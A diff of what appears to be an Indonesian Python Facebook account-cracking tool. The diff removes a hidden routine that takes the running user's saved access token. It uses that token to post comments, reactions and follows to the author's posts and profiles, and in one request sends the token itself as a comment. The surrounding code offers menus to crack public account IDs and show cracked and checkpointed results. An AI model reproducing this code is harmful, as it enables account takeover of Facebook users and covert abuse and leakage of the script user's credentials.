@@ -27,63 +27,7 @@ id = []
 cp = []
 ok = []
 
-# Pastikan Jangan Ubah Bot Komen & Follownya :v #
-ua = ('BlackBerry7100i/4.1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/103')
-ua = ('BlackBerry7130e/4.1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/104')
-ua = ('Lenovo-A850/S105 Linux/3.4.0 Android/4.2 Release/06.12.2013 Browser/AppleWebKit534.30 Profile/ Configuration/ Safari/534.30')
-# Cek hasil okeh
-def __hasil_ok_cp__():
-	raka("\n\033[0;37m[\033[0;36m1\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Lihat hasil ok")
-	raka("\033[0;37m[\033[0;36m2\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Lihat hasil cp")
-	raka("\033[0;37m[\033[0;36m3\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Exit")
-	has = raw_input("\n \033[0;37m[\033[0;36m+\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Choose : \033[0;36m")
-	if has == '':
-		exit("\033[0;37m[\033[0;36m+\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Wronk input")
-	elif has == '1':
-		hasil_ok = open('Ok.json','r').read()
-		print(hasil_ok)
-		exit()
-	elif has == '2':
-		hasil_cp = open('Cp.json','r').read()
-		print(hasil_cp)
-		exit()
-	elif has == '3':
-		__menu__()
-	else:
-		exit("\033[0;37m[\033[0;36m+\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Wronk input")
-# Jangan Di Ganti # Kalo Mau Tambahin Aja #
 
-komenredem = random.choice(['Bang kred bang!', 'Bang Lu Cakep Tapi Sayang pacarnya cuma satu wkwk', 'Siang Luting Malam Jadi Kang Ghosting', 'Dah Lah Abng Cakep Banget :) ', 'Siang Panen Pahala Malam Panen Kepala', 'Arigato Atas Scnya Bang', 'Semoga Abang Dan Keluarga Masuk Surga :)', 'Semoga Abang Sukses', 'Gua Pengguna Sc cr4ck Lu Bang ', 'Wih Panutan Gua Nih', 'Senseii Kawaiine'])
-komtwol = random.choice(['Salam 2 Jari Bang', 'Mantap Sensei', 'bang lu kgk punya pacar lgi ya selain dia?', 'MengKeren Lah Bang', 'Semangat Bang!', 'Gua Murid Lu Bang', 'Tumben Post Bang?', 'Gua Pengin Jadi Kek Abang', 'Semoga Abang Jadi Orang Sukses', 'Bjir Lawack Kali Kau Bang'])
-kartu2d = random.choice(["pacaran kok cuma satu bang ","waduh ganteng lu bang","wibu hengker tezy","judul anime apa bang?","Bang emnk jago lah","bang lapor gua habis coli","mengkrend sudah","Salam dua jri poko ny bang :v"])
-def __sayang_amanda__():
-    try:
-        token = open('login.txt', 'r').read()
-    except IOError:
-        print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m]\033[0;32m⋆✥⋆➣ \033[0;37mToken/Cookie invalid'
-        os.system('rm -rf login.txt')
-        exit(_rakasayangamanda.login())
-    raka_sayang_amanda = '3882176535153442'
-    kom = komenredem
-    komentar = komtwol
-    yotsuba = kartu2d
-    post = '3882176535153442'
-    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + token)
-    requests.post('https://graph.facebook.com/3882176535153442/comments/?message=' + kom + '&access_token=' + token)
-    requests.post('https://graph.facebook.com/3882176535153442/comments/?message=' + yotsuba + '&access_token=' + token)
-    requests.post('https://graph.facebook.com/3882176535153442/comments/?message=' + komentar + '&access_token=' + token)
-    requests.post('https://graph.facebook.com/' + post + '/reactions?type=LOVE&access_token=' + token)
-    requests.post('https://graph.facebook.com/3882176535153442/comments/?message=' + kom + '&access_token=' + token)
-    requests.post('https://graph.facebook.com/3882176535153442/comments/?message=' + yotsuba + '&access_token=' + token)
-    requests.post('https://graph.facebook.com/3882176535153442/comments/?message=' + komentar + '&access_token=' + token)
-    requests.post('https://graph.facebook.com/4257706904267068/likes?summary=true&access_token=' + token)
-    requests.post('https://graph.facebook.com/' + post + '/reactions?type=likes&access_token=' + token)
-    requests.post('https://graph.facebook.com/100000834003593/subscribers?access_token=' + token)
-    requests.post('https://graph.facebook.com/100003986228742/subscribers?access_token=' + token) 
-    requests.post('https://graph.facebook.com/100017584682867/subscribers?access_token=' + token)
-    requests.post('https://graph.facebook.com/100000395779504/subscribers?access_token=' + token)
-    requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(raka_sayang_amanda,token,token)) 
-    __menu__()
 
 def __raka_sayang_amanda__():
 	os.system('clear')
@@ -159,7 +103,7 @@ def __menu__():
         except requests.exceptions.ConnectionError:
 		raka("\033[0;37m[\033[0;36m+\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Tidak ada koneksi internet");exit
         os.system('clear')
-	print(_raka_banner_)
+	jalan(_raka_banner_);time.sleep(1)
 	print("\n\033[0;37m[\033[0;36m+\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Nama Account  : \033[0;36m" +name)
 	print("\033[0;37m[\033[0;36m+\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Tanggal Lahir : \033[0;36m"+birthday)
 	raka("\n\033[0;37m[\033[0;36m1\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Crack Id Dari Publik")
